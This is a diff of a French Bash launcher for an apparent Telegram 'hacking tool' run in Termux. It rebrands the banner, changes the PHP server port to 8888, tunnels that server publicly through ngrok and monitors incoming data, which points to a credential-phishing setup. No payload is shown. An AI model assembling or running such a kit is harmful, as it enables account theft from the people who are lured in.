@@ -21,9 +21,9 @@ animation() {
     echo -e " ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝ ╚═════╝╚═╝  ╚═╝"
     echo -e "${NC}"
     echo -e "${CYAN}==================================================${NC}"
-    echo -e "${VERT}          🇨🇩 TELEGRAM HACKING TOOL PRO 🇨🇩         ${NC}"
+    echo -e "${VERT}          🇨🇩 HACKING TOOL PRO 🇨🇩         ${NC}"
     echo -e "${CYAN}==================================================${NC}"
-    echo -e "${JAUNE}           🔥 HEXTECH CAR - POWERED BY HEXTECH 🔥${NC}"
+    echo -e "${JAUNE}           🔥 HEXTECH  - POWERED BY HEXTECH 🔥${NC}"
     echo -e "${CYAN}==================================================${NC}"
     sleep 1
 }
@@ -82,8 +82,8 @@ surveiller_donnees() {
 
 # Fonction pour démarrer le serveur PHP
 demarrer_serveur_php() {
-    echo -e "${BLEU}[•] Démarrage du serveur PHP sur le port 8080...${NC}"
-    php -S localhost:8080 > /dev/null 2>&1 &
+    echo -e "${BLEU}[•] Démarrage du serveur PHP sur le port 8888...${NC}"
+    php -S localhost:8888 > /dev/null 2>&1 &
     sleep 2
     echo -e "${VERT}[✓] Serveur PHP démarré avec succès!${NC}"
     surveiller_donnees &
@@ -140,7 +140,7 @@ generer_lien_ngrok() {
     
     echo -e "${JAUNE}[•] Démarrage de Ngrok (http:8080)...${NC}"
     echo -e "${CYAN}==================================================${NC}"
-    ~/bin/ngrok http 8080 || {
+    ~/bin/ngrok http 8888 || {
         echo -e "${ROUGE}[!] Erreur lors du lancement de Ngrok.${NC}"
         exit 1
     }
@@ -218,7 +218,7 @@ menu_principal() {
             esac
         ;;
         2)
-            echo -e "${BLEU}Ouverture du canal Telegram HEXTECH CAR...${NC}"
+            echo -e "${BLEU}Ouverture du canal Telegram HEXTECH ...${NC}"
             termux-open-url "https://t.me/hextechcar"
             menu_principal
         ;;
